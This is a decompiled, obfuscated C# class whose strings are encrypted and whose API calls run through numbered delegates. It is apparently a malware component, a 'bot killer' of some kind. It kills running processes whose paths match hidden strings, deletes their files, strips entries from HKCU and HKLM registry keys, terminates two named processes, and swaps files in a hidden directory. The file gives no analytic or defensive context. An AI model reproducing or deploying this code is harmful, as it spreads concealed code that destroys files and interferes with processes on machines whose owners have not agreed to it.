using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

internal class Class0
{
	public static List<string> list_0;

	public static List<string> list_1;

	public static void smethod_0()
	{
		list_1 = new List<string>();
		Process[] array = Delegate56.smethod_0();
		foreach (Process object_ in array)
		{
			try
			{
				if ((Delegate60.smethod_0(Delegate58.smethod_0(Delegate57.smethod_0(object_)), Delegate59.smethod_0((string)_003CModule_003E.smethod_0(3140991389u))) || Delegate60.smethod_0(Delegate58.smethod_0(Delegate57.smethod_0(object_)), Delegate59.smethod_0((string)_003CModule_003E.smethod_0(3140991369u))) || Delegate60.smethod_0(Delegate58.smethod_0(Delegate57.smethod_0(object_)), Delegate59.smethod_0((string)_003CModule_003E.smethod_0(3140991421u))) || Delegate60.smethod_0(Delegate58.smethod_0(Delegate57.smethod_0(object_)), Delegate59.smethod_0((string)_003CModule_003E.smethod_0(3140991412u)))) && Delegate63.smethod_0(Delegate61.smethod_0(object_), Delegate61.smethod_0(Delegate62.smethod_0())))
				{
					Delegate64.smethod_0(Delegate61.smethod_0(object_), Delegate58.smethod_0(Delegate57.smethod_0(object_)));
				}
			}
			catch
			{
			}
		}
		Delegate65.smethod_0();
	}

	public static void smethod_1(string string_0, string string_1)
	{
		Delegate64.smethod_1(string_0, string_1);
		Delegate64.smethod_2(string_0, string_1);
	}

	public static void smethod_2(string string_0, string string_1)
	{
		try
		{
			RegistryKey object_ = Delegate66.smethod_0(Registry.CurrentUser, (string)_003CModule_003E.smethod_0(3647281299u));
			string[] array = Delegate67.smethod_0(object_);
			foreach (string text in array)
			{
				if (Delegate60.smethod_0(Delegate69.smethod_0(Delegate68.smethod_0(object_, text)), string_1) && Delegate63.smethod_0(text, Delegate70.smethod_0()))
				{
					list_1.Add(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(3647281357u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3647281185u), text)), (string)_003CModule_003E.smethod_0(3647281195u)));
					Delegate73.smethod_0(object_, text);
					Delegate74.smethod_0(object_);
				}
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey object_2 = Delegate66.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(3647281299u));
			string[] array2 = Delegate67.smethod_0(object_2);
			foreach (string text2 in array2)
			{
				if (Delegate60.smethod_0(Delegate69.smethod_0(Delegate68.smethod_0(object_2, text2)), string_1) && Delegate63.smethod_0(text2, Delegate70.smethod_0()))
				{
					list_1.Add(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(3647281357u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(3647281201u), text2)), (string)_003CModule_003E.smethod_0(3647281195u)));
					Delegate73.smethod_0(object_2, text2);
					Delegate74.smethod_0(object_2);
				}
			}
		}
		catch
		{
		}
	}

	public static void smethod_3(string string_0, string string_1)
	{
		list_0 = Delegate75.smethod_0();
		try
		{
			Process[] array = Delegate76.smethod_0(string_0);
			foreach (Process object_ in array)
			{
				if (!Delegate63.smethod_0(string_0, (string)_003CModule_003E.smethod_0(121065320u)) || !Delegate63.smethod_0(string_0, (string)_003CModule_003E.smethod_0(121065308u)) || !Delegate63.smethod_0(Class2.string_0, Delegate58.smethod_0(Delegate57.smethod_0(object_))))
				{
					continue;
				}
				foreach (string item in list_0)
				{
					string[] array2 = Delegate77.smethod_0(item, new char[1] { ':' });
					string string_2 = Delegate72.smethod_0(array2[0], (string)_003CModule_003E.smethod_0(121065283u), array2[1]);
					string string_3 = Delegate61.smethod_0(Delegate79.smethod_0(Delegate78.smethod_0(array2[2])));
					if (Delegate63.smethod_1(string_3, Delegate61.smethod_0(object_)))
					{
						list_1.Add(Delegate80.smethod_0(new string[5]
						{
							(string)_003CModule_003E.smethod_0(121065293u),
							Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(121065257u), Delegate61.smethod_0(object_))),
							(string)_003CModule_003E.smethod_0(121065235u),
							Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(121065257u), string_2)),
							(string)_003CModule_003E.smethod_0(121065336u)
						}));
					}
				}
				if (Delegate60.smethod_0(Delegate58.smethod_0(Delegate57.smethod_0(object_)), Delegate59.smethod_0((string)_003CModule_003E.smethod_0(121065439u))))
				{
					Delegate82.smethod_0(Delegate81.smethod_0(object_));
					Delegate82.smethod_1(Delegate81.smethod_0(object_));
				}
				else
				{
					Delegate83.smethod_0(object_);
					Delegate83.smethod_1(object_);
				}
				Delegate84.smethod_0(object_);
				Delegate85.smethod_0(string_1, FileAttributes.Normal);
				Delegate86.smethod_0(string_1);
				list_1.Add(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(121065243u), Delegate59.smethod_1(string_1), (string)_003CModule_003E.smethod_0(121065207u)));
			}
		}
		catch
		{
		}
		list_0.Clear();
	}

	public static void smethod_4()
	{
		list_1 = new List<string>();
		Process[] array = Delegate76.smethod_0((string)_003CModule_003E.smethod_0(3282422848u));
		foreach (Process object_ in array)
		{
			try
			{
				Delegate83.smethod_0(object_);
				Delegate83.smethod_1(object_);
				Delegate84.smethod_0(object_);
			}
			catch
			{
			}
		}
		Process[] array2 = Delegate76.smethod_0((string)_003CModule_003E.smethod_0(3282422877u));
		foreach (Process object_2 in array2)
		{
			try
			{
				Delegate83.smethod_0(object_2);
				Delegate83.smethod_1(object_2);
				Delegate84.smethod_0(object_2);
			}
			catch
			{
			}
		}
		try
		{
			string[] array3 = Delegate87.smethod_0(Delegate59.smethod_0((string)_003CModule_003E.smethod_0(3282423132u)), (string)_003CModule_003E.smethod_0(3282422890u));
			string[] array4 = array3;
			foreach (string text in array4)
			{
				string text2 = text;
				string text3 = Delegate89.smethod_0(text, 0, Delegate88.smethod_0(text) - 4);
				text3 = Delegate89.smethod_0(text, 0, Delegate88.smethod_0(text2));
				if (!Delegate60.smethod_0(text, (string)_003CModule_003E.smethod_0(3282423254u)) && !Delegate60.smethod_0(text, (string)_003CModule_003E.smethod_0(3282423266u)))
				{
					Delegate86.smethod_0(text2);
					Delegate64.smethod_1(text3, text2);
					list_1.Add(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(3282423205u), Delegate59.smethod_1(text2), (string)_003CModule_003E.smethod_0(3282422857u)));
				}
			}
			Delegate90.smethod_0((string)_003CModule_003E.smethod_0(3282422884u));
			Delegate65.smethod_0();
		}
		catch
		{
			Delegate90.smethod_0((string)_003CModule_003E.smethod_0(3282422884u));
		}
	}

	private static void smethod_5()
	{
		List<string> list = new List<string>();
		foreach (string item in list_1)
		{
			if (!list.Contains(item))
			{
				list.Add(item);
			}
		}
		foreach (string item2 in list)
		{
			Delegate64.smethod_3(item2, Delegate70.smethod_1());
			Delegate82.smethod_2(200);
		}
		list_1.Clear();
		list.Clear();
	}
}
